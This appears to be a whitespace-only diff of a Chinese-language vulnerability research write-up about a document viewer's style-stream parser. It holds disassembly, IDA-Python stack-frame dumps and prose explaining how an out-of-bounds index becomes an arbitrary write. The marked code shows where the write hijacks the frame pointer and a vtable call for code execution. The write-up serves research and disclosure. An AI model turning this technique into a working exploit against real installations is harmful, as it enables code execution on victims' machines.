@@ -848,7 +848,7 @@ struc_3a9de4 *__thiscall constructor_3a9de4(struc_3a9de4 *this)
 object_9bd120 *__thiscall object_10cbd2::get_field(38)_7b15a6(object_10cbd2 *this, __int16 avw_noCreate_0)
 object_9bd0e4 *__thiscall object_10cbd2::get_field(34)_7b9e07(object_10cbd2 *this, __int16)
 void __EH_epilog3_GS)
- 
+ 
 # Only this prototype references our object as its "this" parameter.
 int __thiscall struc_3a9de4::parseStylesContent_3a7048(struc_3a9de4 *this, JSVDA::object_OSEG *ap_oseg_0, int av_position(lo)_4, int av_position(hi)_8, int av_currentStreamState?_c, frame_3a7048_arg_10 ap_unkobjectunion_10, frame_3a7048_arg_14 ap_nullunion_14)
 ```  
@@ -860,33 +860,33 @@ struc_3a9de4::parseStylesContent_3a7048方法期间， 表示的对象this存储
 %edi此方法的寄存器来找到指向此结构的指针。为了找到候选者，我们可以手动从调用堆栈中遍历并枚举使用该类型的所有位置，或者我们可以使用调试器来监视引用结构内任何内容的位置。幸运的是，我们的搜索空间相对较小，我们可以在下面的列表中轻松找到它。  
   
 ```
-.text:3BE27048 000                 push    ebp
-.text:3BE27049 004                 mov     ebp, esp
-.text:3BE2704B 004                 sub     esp, 0Ch
-.text:3BE2704E 010                 and     [ebp+lv_result_4], 0
-.text:3BE27052 010                 push    ebx
-.text:3BE27053 014                 mov     ebx, [ebp+ap_oseg_0]                             ; parameter: struc_3a9de4 *this
+.text:3BE27048 000                 push    ebp
+.text:3BE27049 004                 mov     ebp, esp
+.text:3BE2704B 004                 sub     esp, 0Ch
+.text:3BE2704E 010                 and     [ebp+lv_result_4], 0
+.text:3BE27052 010                 push    ebx
+.text:3BE27053 014                 mov     ebx, [ebp+ap_oseg_0]                             ; parameter: struc_3a9de4 *this
 ...
-.text:3BE274D4     loc_3BE274D4:
-.text:3BE274D4 01C                 mov     ecx, [ecx+object_9c2044.v_data_290.p_object_84]
-.text:3BE274DA 01C                 mov     eax, [ecx+object_9c2d50.v_data_4.p_object_60]
-.text:3BE274DD 01C                 test    eax, eax
-.text:3BE274DF 01C                 jnz     short loc_3BE274EE
-.text:3BE274E1 01C                 call    object_9c2d50::create_field(64)_6bf3a6
-.text:3BE274E6 01C                 test    eax, eax
-.text:3BE274E8 01C                 jz      loc_3BE27625
+.text:3BE274D4     loc_3BE274D4:
+.text:3BE274D4 01C                 mov     ecx, [ecx+object_9c2044.v_data_290.p_object_84]
+.text:3BE274DA 01C                 mov     eax, [ecx+object_9c2d50.v_data_4.p_object_60]
+.text:3BE274DD 01C                 test    eax, eax
+.text:3BE274DF 01C                 jnz     short loc_3BE274EE
+.text:3BE274E1 01C                 call    object_9c2d50::create_field(64)_6bf3a6
+.text:3BE274E6 01C                 test    eax, eax
+.text:3BE274E8 01C                 jz      loc_3BE27625
 .text:3BE274EE
-.text:3BE274EE     loc_3BE274EE:
-.text:3BE274EE 01C                 lea     ecx, [ebp+lv_result_4]
-.text:3BE274F1 01C                 push    ecx
-.text:3BE274F2 020                 push    dword ptr [ebp+ap_unkobjectunion_10]
-.text:3BE274F5 024                 mov     ecx, eax
-.text:3BE274F7 024                 push    [edi+struc_3a9de4.v_documentType_8]
-.text:3BE274FA 028                 push    [ebp+ap_oseg_0]
-.text:3BE274FD 02C                 push    [edi+struc_3a9de4.v_header_long_4]
-.text:3BE27500 030                 push    ebx                                              ; pushed onto stack
-.text:3BE27501 034                 call    object_9d0d30::readStyleType(2008)_391906
-.text:3BE27506 01C                 jmp     loc_3BE2736F
+.text:3BE274EE     loc_3BE274EE:
+.text:3BE274EE 01C                 lea     ecx, [ebp+lv_result_4]
+.text:3BE274F1 01C                 push    ecx
+.text:3BE274F2 020                 push    dword ptr [ebp+ap_unkobjectunion_10]
+.text:3BE274F5 024                 mov     ecx, eax
+.text:3BE274F7 024                 push    [edi+struc_3a9de4.v_documentType_8]
+.text:3BE274FA 028                 push    [ebp+ap_oseg_0]
+.text:3BE274FD 02C                 push    [edi+struc_3a9de4.v_header_long_4]
+.text:3BE27500 030                 push    ebx                                              ; pushed onto stack
+.text:3BE27501 034                 call    object_9d0d30::readStyleType(2008)_391906
+.text:3BE27506 01C                 jmp     loc_3BE2736F
 ```  
   
   
@@ -912,57 +912,57 @@ lv_wstring(28)_54属于我们的易受攻击函数框架的字段重叠。
   
 ```
 # Assign the callstacks that we will be comparing.
-callstack_for_vulnerability =                           [0x3be11906, 0x3be27048]
-callstack_for_conditional =     [0x3c36a51f, 0x3bdfd8f8, 0x3c13f3a6, 0x3be27048]
- 
+callstack_for_vulnerability =                           [0x3be11906, 0x3be27048]
+callstack_for_conditional =     [0x3c36a51f, 0x3bdfd8f8, 0x3c13f3a6, 0x3be27048]
+ 
 # Print out the first layout (right-aligned to offset 0).
 Python> [frame.members for frame in struc.right(0, map(function.frame, callstack_for_vulnerability))]
 [<class 'structure' name='$ F3BE11906' offset=-0x11c size=0xe4>
-     -11c+0x10                                          [None, 16]
-[0]  -10c+0x4                  int 'var_B4'             (<class 'int'>, 4)
-[1]  -108+0x4                  int 'var_B0'             (<class 'int'>, 4)
-[2]  -104+0x2              __int16 'var_AC'             (<class 'int'>, 2)
+     -11c+0x10                                          [None, 16]
+[0]  -10c+0x4                  int 'var_B4'             (<class 'int'>, 4)
+[1]  -108+0x4                  int 'var_B0'             (<class 'int'>, 4)
+[2]  -104+0x2              __int16 'var_AC'             (<class 'int'>, 2)
 ...
-[8]   -c+0x4                 int 'av_currentStreamState?_c' (<class 'int'>, 4)      # [note] usually 2, and seems to be only used during function exit
-[9]   -8+0x4 frame_3a7048_arg_10 'ap_unkobjectunion_10'     <class 'union' name='frame_3a7048_arg_10' offset=-0x8 size=0x4>
-[10]  -4+0x4 frame_3a7048_arg_14 'ap_boxunion_14'           <class 'union' name='frame_3a7048_arg_14' offset=-0x4 size=0x4>] # [note] used by types 0x2008 and 0x2010
- 
+[8]   -c+0x4                 int 'av_currentStreamState?_c' (<class 'int'>, 4)      # [note] usually 2, and seems to be only used during function exit
+[9]   -8+0x4 frame_3a7048_arg_10 'ap_unkobjectunion_10'     <class 'union' name='frame_3a7048_arg_10' offset=-0x8 size=0x4>
+[10]  -4+0x4 frame_3a7048_arg_14 'ap_boxunion_14'           <class 'union' name='frame_3a7048_arg_14' offset=-0x4 size=0x4>] # [note] used by types 0x2008 and 0x2010
+ 
 # Print out the second layout (right-aligned to offset 0).
 Python> [frame.members for frame in struc.right(0, map(function.frame, callstack_for_conditional)))]
 [<class 'structure' name='$ F3C36A51F' offset=-0x98 size=0x8>
-[0] -98+0x4 char[4] ' r'    [(<class 'int'>, 1), 4]
-[1] -94+0x4     int 'arg_0' (<class 'int'>, 4), <class 'structure' name='$ F3BDFD8F8' offset=-0x90 size=0x30>
-    -90+0x10                      [None, 16]
-[0] -80+0x4      int 'var_10'     (<class 'int'>, 4)
+[0] -98+0x4 char[4] ' r'    [(<class 'int'>, 1), 4]
+[1] -94+0x4     int 'arg_0' (<class 'int'>, 4), <class 'structure' name='$ F3BDFD8F8' offset=-0x90 size=0x30>
+    -90+0x10                      [None, 16]
+[0] -80+0x4      int 'var_10'     (<class 'int'>, 4)
 ...
-[5]  -18+0x4 JSVDA::object_OSEG* 'ap_oseg_0'                (<class 'type'>, 4)
-[6]  -14+0x4                 int 'av_position(lo)_4'        (<class 'int'>, 4)
-[7]  -10+0x4                 int 'av_position(hi)_8'        (<class 'int'>, 4)
-[8]   -c+0x4                 int 'av_currentStreamState?_c' (<class 'int'>, 4)      # [note] usually 2, and seems to be only used during function exit
-[9]   -8+0x4 frame_3a7048_arg_10 'ap_unkobjectunion_10'     <class 'union' name='frame_3a7048_arg_10' offset=-0x8 size=0x4>
-[10]  -4+0x4 frame_3a7048_arg_14 'ap_boxunion_14'           <class 'union' name='frame_3a7048_arg_14' offset=-0x4 size=0x4>] # [note] used by types 0x2008 and 0x2010
- 
+[5]  -18+0x4 JSVDA::object_OSEG* 'ap_oseg_0'                (<class 'type'>, 4)
+[6]  -14+0x4                 int 'av_position(lo)_4'        (<class 'int'>, 4)
+[7]  -10+0x4                 int 'av_position(hi)_8'        (<class 'int'>, 4)
+[8]   -c+0x4                 int 'av_currentStreamState?_c' (<class 'int'>, 4)      # [note] usually 2, and seems to be only used during function exit
+[9]   -8+0x4 frame_3a7048_arg_10 'ap_unkobjectunion_10'     <class 'union' name='frame_3a7048_arg_10' offset=-0x8 size=0x4>
+[10]  -4+0x4 frame_3a7048_arg_14 'ap_boxunion_14'           <class 'union' name='frame_3a7048_arg_14' offset=-0x4 size=0x4>] # [note] used by types 0x2008 and 0x2010
+ 
 # Emit the members from the vulnerability's backtrace that are worth dereferencing.
 Python> [frame.members.list(bounds=(-0xc4, -0x58)) for frame in struc.right(0, map(function.frame, callstack_for_vulnerability))]
-[19] -c4:+0x18 object_9d15a0*[6] 'lv_objects(6)_6c'  [(<class 'type'>, 4), 6]
-[20] -ac:+0x50       wchar_t[40] 'lv_wstring(28)_54' [(<class 'int'>, 2), 40]
-[21] -5c:+0x4                int 'var_4'             (<class 'int'>, 4)
- 
+[19] -c4:+0x18 object_9d15a0*[6] 'lv_objects(6)_6c'  [(<class 'type'>, 4), 6]
+[20] -ac:+0x50       wchar_t[40] 'lv_wstring(28)_54' [(<class 'int'>, 2), 40]
+[21] -5c:+0x4                int 'var_4'             (<class 'int'>, 4)
+ 
 # Emit the members within the other backtrace that overlaps "lv_wstring(28)_54".."var_4".
 Python> [frame.members.list(bounds=(-0xac, -0x58)) for frame in struc.right(0, map(function.frame, callstack_for_conditional))]
-[2] -ac:+0x4     int 'var_14'        (<class 'int'>, 4)
-[3] -a8:+0x4     int 'lv_canary_10'  (<class 'int'>, 4)
-[4] -a4:+0x4     int 'lv_reg(edi)_c' (<class 'int'>, 4)
-[5] -a0:+0x4     int 'lv_reg(esi)_8' (<class 'int'>, 4)
-[6] -9c:+0x4     int 'lv_reg(ebx)_4' (<class 'int'>, 4)
-[7] -98:+0x4 char[4] ' r'            [(<class 'int'>, 1), 4]
-[8] -94:+0x4     int 'arg_0'         (<class 'int'>, 4)
-[0] -80:+0x4     int 'var_10'     (<class 'int'>, 4)
-[1] -74:+0x4     int 'var_4'      (<class 'int'>, 4)
-[2] -70:+0x4 char[4] ' s'         [(<class 'int'>, 1), 4]
-[3] -6c:+0x4 char[4] ' r'         [(<class 'int'>, 1), 4]
-[4] -68:+0x4     int 'ap_owner_0' (<class 'int'>, 4)
-[5] -64:+0x4     int 'ap_owner_4' (<class 'int'>, 4)
+[2] -ac:+0x4     int 'var_14'        (<class 'int'>, 4)
+[3] -a8:+0x4     int 'lv_canary_10'  (<class 'int'>, 4)
+[4] -a4:+0x4     int 'lv_reg(edi)_c' (<class 'int'>, 4)
+[5] -a0:+0x4     int 'lv_reg(esi)_8' (<class 'int'>, 4)
+[6] -9c:+0x4     int 'lv_reg(ebx)_4' (<class 'int'>, 4)
+[7] -98:+0x4 char[4] ' r'            [(<class 'int'>, 1), 4]
+[8] -94:+0x4     int 'arg_0'         (<class 'int'>, 4)
+[0] -80:+0x4     int 'var_10'     (<class 'int'>, 4)
+[1] -74:+0x4     int 'var_4'      (<class 'int'>, 4)
+[2] -70:+0x4 char[4] ' s'         [(<class 'int'>, 1), 4]
+[3] -6c:+0x4 char[4] ' r'         [(<class 'int'>, 1), 4]
+[4] -68:+0x4     int 'ap_owner_0' (<class 'int'>, 4)
+[5] -64:+0x4     int 'ap_owner_4' (<class 'int'>, 4)
 ```  
   
   
@@ -980,7 +980,7 @@ struc_3a9de4::parseStylesContent_3a7048。这会下降到
 struc_3a9de4::readBoxHeader?_3a6fae函数中，然后函数依赖于库中定义的方法  
 JSVDA.DLL。该方法的序言还将  
 %edi寄存器压入堆栈。如果我们在写入此地址时设置内存访问断点并修改文档以避免遇到我们在函数中识别的任何其他条件，我们可以确认保留的引用可以  
-lv_struc_38在我们所需的范围内访问。   
+lv_struc_38在我们所需的范围内访问。   
   
   
 最后，我们已经能够将漏洞的功能（最初是越界数组索引）扩展到具有 32 位写入的相对取消引用。然后，我们重用了包含漏洞的函数中的一些功能，将漏洞提升为对绝对地址的任意长度写入。之后，我们利用控制流来允许我们对  
@@ -995,27 +995,27 @@ object_9c2044::method_processStreams_77af0f。在应用程序解析我们的流�
 ```
 # List the frame belonging to the caller of the function containing the vulnerability.
 <class 'structure' name='$ F3C1FAF0F' offset=-0x264 size=0x278>
-[0]  -264+0x4                       int 'var_25C'            (<class 'int'>, 4)
-[1]  -260+0x4                       int 'var_258'            (<class 'int'>, 4)
-[2]  -25c+0x4                       int 'var_254'            (<class 'int'>, 4)
-[3]  -258+0x4                       int 'var_250'            (<class 'int'>, 4)
-[4]  -254+0x18  frame_77af0f::field_24c 'lv_struc_24c'       <class 'structure' name='frame_77af0f::field_24c' offset=-0x254 size=0x18>
-[5]  -23c+0x4                       int 'lp_stackObject_234' (<class 'int'>, 4)
-[6]  -238+0x4       JSVDA::object_OFRM* 'lp_oframe_230'      (<class 'type'>, 4)
-[7]  -234+0x228           object_2f27f8 'lv_object_22c'      <class 'structure' name='object_2f27f8' offset=-0x234 size=0x228>
-[8]    -c+0x4                       int 'lv_result_4'        (<class 'int'>, 4)
-[9]    -8+0x4                   char[4] ' s'                 [(<class 'int'>, 1), 4]
-[10]   -4+0x4                   char[4] ' r'                 [(<class 'int'>, 1), 4]
-[11]    0+0x4       JSVDA::object_OFRM* 'ap_oframe_0'        (<class 'type'>, 4)
-[12]    4+0x4              unsigned int 'av_documentType_4'  (<class 'int'>, 4)
-[13]    8+0x4              unsigned int 'av_flags_8'         (<class 'int'>, 4)
-[14]    c+0x4             struc_79aa9a* 'ap_stackobject_c'   (<class 'type'>, 4)
-[15]   10+0x4                       int 'ap_null_10'         (<class 'int'>, 4)
- 
+[0]  -264+0x4                       int 'var_25C'            (<class 'int'>, 4)
+[1]  -260+0x4                       int 'var_258'            (<class 'int'>, 4)
+[2]  -25c+0x4                       int 'var_254'            (<class 'int'>, 4)
+[3]  -258+0x4                       int 'var_250'            (<class 'int'>, 4)
+[4]  -254+0x18  frame_77af0f::field_24c 'lv_struc_24c'       <class 'structure' name='frame_77af0f::field_24c' offset=-0x254 size=0x18>
+[5]  -23c+0x4                       int 'lp_stackObject_234' (<class 'int'>, 4)
+[6]  -238+0x4       JSVDA::object_OFRM* 'lp_oframe_230'      (<class 'type'>, 4)
+[7]  -234+0x228           object_2f27f8 'lv_object_22c'      <class 'structure' name='object_2f27f8' offset=-0x234 size=0x228>
+[8]    -c+0x4                       int 'lv_result_4'        (<class 'int'>, 4)
+[9]    -8+0x4                   char[4] ' s'                 [(<class 'int'>, 1), 4]
+[10]   -4+0x4                   char[4] ' r'                 [(<class 'int'>, 1), 4]
+[11]    0+0x4       JSVDA::object_OFRM* 'ap_oframe_0'        (<class 'type'>, 4)
+[12]    4+0x4              unsigned int 'av_documentType_4'  (<class 'int'>, 4)
+[13]    8+0x4              unsigned int 'av_flags_8'         (<class 'int'>, 4)
+[14]    c+0x4             struc_79aa9a* 'ap_stackobject_c'   (<class 'type'>, 4)
+[15]   10+0x4                       int 'ap_null_10'         (<class 'int'>, 4)
+ 
 # The object located at offset -0x238 of the frame.
 <class 'structure' name='JSVDA::object_OFRM' size=0x8> // [alloc.tag] OFRM
 [0] 0+0x4 int 'p_vftable_0' (<class 'int'>, 4) // [vftable] 0x278186F0
-[1] 4+0x4 int 'v_index_4'   (<class 'int'>, 4) // {'note': 'object_117c5 handle', 'alloc.tag': 'MFCM', '__name__': 'v_index_4'}
+[1] 4+0x4 int 'v_index_4'   (<class 'int'>, 4) // {'note': 'object_117c5 handle', 'alloc.tag': 'MFCM', '__name__': 'v_index_4'}
 ```  
   
   
@@ -1025,96 +1025,96 @@ object_9c2044::method_processStreams_77af0f。在应用程序解析我们的流�
 但是，我们确实可以控制该对象的虚拟方法表引用，并且由于我们还没有完全破坏应用程序，因此我们可以从其他地方捕获句柄，并在稍后阶段使用它来重新伪造该对象。赢得了堆栈的控制权。之后，我们可以在装载机期间修复框架，以保持应用程序的良好信誉。  
   
 ```
-.text:3C1FB1B6     loc_3C1FB1B6:
-.text:3C1FB1B6 260                 push    [ebp+av_flags_8]
-.text:3C1FB1B9 264                 mov     eax, [ebp+av_flags_8]
-.text:3C1FB1BC 264                 push    ecx
-.text:3C1FB1BD 268                 and     eax, 800h
-.text:3C1FB1C2 268                 mov     ecx, esi
-.text:3C1FB1C4 268                 push    ebx
-.text:3C1FB1C5 26C                 mov     [ebp+lv_struc_24c.field_14], eax
-.text:3C1FB1CB 26C                 call    object_9c2044::parseStream(DocumentViewStyles)_3a790a ; [note.exp] define some styles, ensure everything is initialized.
-.text:3C1FB1D0 260                 mov     ebx, eax
-.text:3C1FB1D2 260                 cmp     ebx, edi
-.text:3C1FB1D4 260                 jnz     loc_3C1FAFD2
- 
-.text:3C1FB1DA 260                 push    [ebp+av_flags_8]
-.text:3C1FB1DD 264                 mov     ecx, esi
-.text:3C1FB1DF 264                 push    [ebp+av_documentType_4]
-.text:3C1FB1E2 268                 push    [ebp+lp_oframe_230]
-.text:3C1FB1E8 26C                 call    object_9c2044::parseStream(DocumentEditStyles)_3a6cb2 ; [note.exp] hijack frame pointer here
-.text:3C1FB1ED 260                 mov     ebx, eax
-.text:3C1FB1EF 260                 cmp     ebx, edi
-.text:3C1FB1F1 260                 jnz     loc_3C1FAFD2
- 
-.text:3C1FB1F7 260                 push    [ebp+lp_stackObject_234]
-.text:3C1FB1FD 264                 mov     ecx, [esi+2D8h] ; this
-.text:3C1FB203 264                 push    [ebp+av_flags_8] ; av_flags_8
-.text:3C1FB206 268                 push    [ebp+av_documentType_4] ; av_documentType_4
-.text:3C1FB209 26C                 push    [ebp+lp_oframe_230] ; ap_oframe_0
-.text:3C1FB20F 270                 call    object_10cbd2::processSomeStreams_778971 ; [note.exp] hijack execution here
-.text:3C1FB214 264                 mov     ebx, eax
-.text:3C1FB216 264                 cmp     ebx, edi
-.text:3C1FB218 264                 jnz     loc_3C1FAFD2
+.text:3C1FB1B6     loc_3C1FB1B6:
+.text:3C1FB1B6 260                 push    [ebp+av_flags_8]
+.text:3C1FB1B9 264                 mov     eax, [ebp+av_flags_8]
+.text:3C1FB1BC 264                 push    ecx
+.text:3C1FB1BD 268                 and     eax, 800h
+.text:3C1FB1C2 268                 mov     ecx, esi
+.text:3C1FB1C4 268                 push    ebx
+.text:3C1FB1C5 26C                 mov     [ebp+lv_struc_24c.field_14], eax
+.text:3C1FB1CB 26C                 call    object_9c2044::parseStream(DocumentViewStyles)_3a790a ; [note.exp] define some styles, ensure everything is initialized.
+.text:3C1FB1D0 260                 mov     ebx, eax
+.text:3C1FB1D2 260                 cmp     ebx, edi
+.text:3C1FB1D4 260                 jnz     loc_3C1FAFD2
+ 
+.text:3C1FB1DA 260                 push    [ebp+av_flags_8]
+.text:3C1FB1DD 264                 mov     ecx, esi
+.text:3C1FB1DF 264                 push    [ebp+av_documentType_4]
+.text:3C1FB1E2 268                 push    [ebp+lp_oframe_230]
+.text:3C1FB1E8 26C                 call    object_9c2044::parseStream(DocumentEditStyles)_3a6cb2 ; [note.exp] hijack frame pointer here
+.text:3C1FB1ED 260                 mov     ebx, eax
+.text:3C1FB1EF 260                 cmp     ebx, edi
+.text:3C1FB1F1 260                 jnz     loc_3C1FAFD2
+ 
+.text:3C1FB1F7 260                 push    [ebp+lp_stackObject_234]
+.text:3C1FB1FD 264                 mov     ecx, [esi+2D8h] ; this
+.text:3C1FB203 264                 push    [ebp+av_flags_8] ; av_flags_8
+.text:3C1FB206 268                 push    [ebp+av_documentType_4] ; av_documentType_4
+.text:3C1FB209 26C                 push    [ebp+lp_oframe_230] ; ap_oframe_0
+.text:3C1FB20F 270                 call    object_10cbd2::processSomeStreams_778971 ; [note.exp] hijack execution here
+.text:3C1FB214 264                 mov     ebx, eax
+.text:3C1FB216 264                 cmp     ebx, edi
+.text:3C1FB218 264                 jnz     loc_3C1FAFD2
 ```  
   
   
-我们能够劫持执行的第一个地方是当拥有我们正在控制的虚拟方法表的对象用于打开下一个流时。列出的代码显示了我们控制帧指针的范围。在我们的漏洞利用中，我们在这里劫持执行并完全转向我们控制的堆栈，以完成将可执行代码加载到地址空间的必要任务。   
+我们能够劫持执行的第一个地方是当拥有我们正在控制的虚拟方法表的对象用于打开下一个流时。列出的代码显示了我们控制帧指针的范围。在我们的漏洞利用中，我们在这里劫持执行并完全转向我们控制的堆栈，以完成将可执行代码加载到地址空间的必要任务。   
   
 ```
-.text:3C1FB1F7 260                 push    [ebp+lp_stackObject_234]
-.text:3C1FB1FD 264                 mov     ecx, [esi+2D8h] ; this
-.text:3C1FB203 264                 push    [ebp+av_flags_8] ; av_flags_8
-.text:3C1FB206 268                 push    [ebp+av_documentType_4] ; av_documentType_4
-.text:3C1FB209 26C                 push    [ebp+lp_oframe_230] ; ap_oframe_0
-.text:3C1FB20F 270                 call    object_10cbd2::processSomeStreams_778971 ; [note.exp] hijack execution here
+.text:3C1FB1F7 260                 push    [ebp+lp_stackObject_234]
+.text:3C1FB1FD 264                 mov     ecx, [esi+2D8h] ; this
+.text:3C1FB203 264                 push    [ebp+av_flags_8] ; av_flags_8
+.text:3C1FB206 268                 push    [ebp+av_documentType_4] ; av_documentType_4
+.text:3C1FB209 26C                 push    [ebp+lp_oframe_230] ; ap_oframe_0
+.text:3C1FB20F 270                 call    object_10cbd2::processSomeStreams_778971 ; [note.exp] hijack execution here
 \
-.text:3C1F8971 000                 push    0A4h
-.text:3C1F8976 004                 mov     eax, offset byte_3C3CCE1A
-.text:3C1F897B 004                 call    __EH_prolog3_catch_GS
-.text:3C1F8980 0C4                 mov     edi, ecx
-.text:3C1F8982 0C4                 mov     [ebp+lp_this_64], edi
+.text:3C1F8971 000                 push    0A4h
+.text:3C1F8976 004                 mov     eax, offset byte_3C3CCE1A
+.text:3C1F897B 004                 call    __EH_prolog3_catch_GS
+.text:3C1F8980 0C4                 mov     edi, ecx
+.text:3C1F8982 0C4                 mov     [ebp+lp_this_64], edi
 ...
-.text:3C1F89B1 0C4                 lea     eax, [ebp+lp_stream_50]
-.text:3C1F89B4 0C4                 push    eax
-.text:3C1F89B5 0C8                 push    ebx
-.text:3C1F89B6 0CC                 call    object_FRM::getStream(GroupingFileName)_1b974d
+.text:3C1F89B1 0C4                 lea     eax, [ebp+lp_stream_50]
+.text:3C1F89B4 0C4                 push    eax
+.text:3C1F89B5 0C8                 push    ebx
+.text:3C1F89B6 0CC                 call    object_FRM::getStream(GroupingFileName)_1b974d
 \
-.text:3BC3974D 000                 push    ebp
-.text:3BC3974E 004                 mov     ebp, esp
-.text:3BC39750 004                 push    [ebp+ap_result_4] ; JSVDA::object_OSEG **
-.text:3BC39753 008                 push    10h             ; av_flags_8
-.text:3BC39755 00C                 push    offset str.GroupingFileName ; [OpenStreamByName.reference] 0x3bc3975d
-.text:3BC3975A 010                 push    [ebp+ap_oframe_0] ; ap_oframe_0
-.text:3BC3975D 014                 call    object_OFRM::openStreamByName?_132de4
+.text:3BC3974D 000                 push    ebp
+.text:3BC3974E 004                 mov     ebp, esp
+.text:3BC39750 004                 push    [ebp+ap_result_4] ; JSVDA::object_OSEG **
+.text:3BC39753 008                 push    10h             ; av_flags_8
+.text:3BC39755 00C                 push    offset str.GroupingFileName ; [OpenStreamByName.reference] 0x3bc3975d
+.text:3BC3975A 010                 push    [ebp+ap_oframe_0] ; ap_oframe_0
+.text:3BC3975D 014                 call    object_OFRM::openStreamByName?_132de4
 \
-.text:3BBB2DE4 000                 push    ebp
-.text:3BBB2DE5 004                 mov     ebp, esp
-.text:3BBB2DE7 004                 push    ecx
-.text:3BBB2DE8 008                 mov     eax, ___security_cookie
-.text:3BBB2DED 008                 xor     eax, ebp
-.text:3BBB2DEF 008                 mov     [ebp+var_4], eax
+.text:3BBB2DE4 000                 push    ebp
+.text:3BBB2DE5 004                 mov     ebp, esp
+.text:3BBB2DE7 004                 push    ecx
+.text:3BBB2DE8 008                 mov     eax, ___security_cookie
+.text:3BBB2DED 008                 xor     eax, ebp
+.text:3BBB2DEF 008                 mov     [ebp+var_4], eax
 ...
-.text:3BBB2E1D     loc_3BBB2E1D:
-.text:3BBB2E1D 00C                 push    [ebp+ap_result_c]
-.text:3BBB2E20 010                 mov     ecx, [ebp+ap_oframe_0]
-.text:3BBB2E23 010                 push    0
-.text:3BBB2E25 014                 push    [ebp+av_flags_8]
-.text:3BBB2E28 018                 mov     edx, [ecx+JSVDA::object_OFRM.p_vftable_0] ; [note.exp] this is ours
-.text:3BBB2E2A 018                 push    0
-.text:3BBB2E2C 01C                 push    eax
-.text:3BBB2E2D 020                 push    ecx
-.text:3BBB2E2E 024                 call    dword ptr [edx+10h] ; [note.exp] branch here
+.text:3BBB2E1D     loc_3BBB2E1D:
+.text:3BBB2E1D 00C                 push    [ebp+ap_result_c]
+.text:3BBB2E20 010                 mov     ecx, [ebp+ap_oframe_0]
+.text:3BBB2E23 010                 push    0
+.text:3BBB2E25 014                 push    [ebp+av_flags_8]
+.text:3BBB2E28 018                 mov     edx, [ecx+JSVDA::object_OFRM.p_vftable_0] ; [note.exp] this is ours
+.text:3BBB2E2A 018                 push    0
+.text:3BBB2E2C 01C                 push    eax
+.text:3BBB2E2D 020                 push    ecx
+.text:3BBB2E2E 024                 call    dword ptr [edx+10h] ; [note.exp] branch here
 \
 ; int __stdcall object_OFRM::method_openStream_2b5c5(JSVDA::object_OFRM *ap_this_0, wchar_t *ap_streamName_4, int a_unused_8, char avb_flags_c, int a_unused_10, JSVDA::object_OSEG **ap_result_14)
-.text:277CB5C5     object_OFRM::method_openStream_2b5c5 proc near
+.text:277CB5C5     object_OFRM::method_openStream_2b5c5 proc near
 .text:277CB5C5
-.text:277CB5C5 000                 push    ebp
-.text:277CB5C6 004                 mov     ebp, esp
-.text:277CB5C8 004                 push    ecx
-.text:277CB5C9 008                 push    ecx
-.text:277CB5CA 00C                 push    ebx
-.text:277CB5CB 010                 mov     ebx, [ebp+ap_result_14]
+.text:277CB5C5 000                 push    ebp
+.text:277CB5C6 004                 mov     ebp, esp
+.text:277CB5C8 004                 push    ecx
+.text:277CB5C9 008                 push    ecx
+.text:277CB5CA 00C                 push    ebx
+.text:277CB5CB 010                 mov     ebx, [ebp+ap_result_14]
 ...
 ```  
   
@@ -1148,37 +1148,37 @@ object_9c2044::readStyleType(1000)_4d951d是一个可能的候选者。通过手
 ```
 # Grab the address of the function containing the different cases for record parsing
 Python> f = db.a('struc_3a9de4::parseStylesContent_3a7048')
- 
+ 
 # List all functions that are called that also have a frame.
 Python> db.functions.list(frame=True, ea=[ins.op_ref(oref) for oref in func.calls(f) if 'x' in oref])
-[0]  +0x0b8d12 : 0x3bb38d12..0x3bb38d71 : (1) FvD+ : __thiscall object_9c2d50::get_field(180)_b8d12                  : lvars:001c args:2 refs:7   exits:1
-[1]  +0x109b2a : 0x3bb89b2a..0x3bb89b9e : (1) FvD+ : __thiscall object_10cbd2::get_field(3c)_109b2a                  : lvars:001c args:2 refs:100 exits:1
-[2]  +0x1329ce : 0x3bbb29ce..0x3bbb29e8 : (1) Fvt+ :    __cdecl object_OSEG::setCurrentStreamPosition_1329ce         : lvars:0000 args:5 refs:182 exits:1
-[3]  +0x1b6bf7 : 0x3bc36bf7..0x3bc36d66 : (1) FvD* : __thiscall object_9e5ffc::readStyleType(1000)_1b6bf7            : lvars:0044 args:4 refs:1   exits:1
-[4]  +0x1b8cd2 : 0x3bc38cd2..0x3bc38d0b : (1) FvD* : __thiscall object_9e5ffc::readStyleType(1001)_1b8cd2            : lvars:0004 args:4 refs:1   exits:1
-[5]  +0x1b8f99 : 0x3bc38f99..0x3bc39723 : (1) FvD* : __thiscall object_9bd0e4::readStyleType(2001)_1b8f99            : lvars:00a0 args:7 refs:2   exits:1
-[6]  +0x1cdcf6 : 0x3bc4dcf6..0x3bc4df7b : (1) FvD* : __thiscall object_9bd184::readStyleType(2002)_1cdcf6            : lvars:0040 args:5 refs:1   exits:1
-[7]  +0x1d24a9 : 0x3bc524a9..0x3bc52bef : (1) FvD* : __thiscall object_9bd0e4::readStyleType(2001)_1d24a9            : lvars:00b4 args:6 refs:1   exits:1
-[8]  +0x1d63a3 : 0x3bc563a3..0x3bc56601 : (1) FvT* : __thiscall object_9bd120::readStyleType(2003)_1d63a3            : lvars:0094 args:5 refs:1   exits:1
-[9]  +0x391906 : 0x3be11906..0x3be11d9c : (1) FvT* : __thiscall object_9d0d30::readStyleType(2008)_391906            : lvars:00c4 args:7 refs:1   exits:2
-[10] +0x392cab : 0x3be12cab..0x3be12ee2 : (1) FvT* : __thiscall object_9d0d30::readStyleType(2010)_392cab            : lvars:0064 args:7 refs:1   exits:1
-[11] +0x393e4b : 0x3be13e4b..0x3be13f08 : (1) F-D+ :    __cdecl object_OSEG::pushCurrentStream?_393e4b               : lvars:000c args:5 refs:1   exits:1
-[12] +0x3a6bec : 0x3be26bec..0x3be26cb2 : (1) FvD* : __thiscall struc_3a9de4::readStyleType(2005)_3a6bec             : lvars:0014 args:4 refs:1   exits:1
-[13] +0x3a6cf0 : 0x3be26cf0..0x3be26d44 : (1) FvD+ :    __cdecl object_OSEG::decode_long_3a6cf0                      : lvars:001c args:2 refs:86  exits:1
-[14] +0x3a6d44 : 0x3be26d44..0x3be26d8b : (1) FvT+ : __thiscall box_header::deserialize_3a6d44                       : lvars:000c args:2 refs:7   exits:1
-[15] +0x3a6d8b : 0x3be26d8b..0x3be26fae : (1) F-T+ : __thiscall struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b : lvars:0008 args:2 refs:11  exits:1
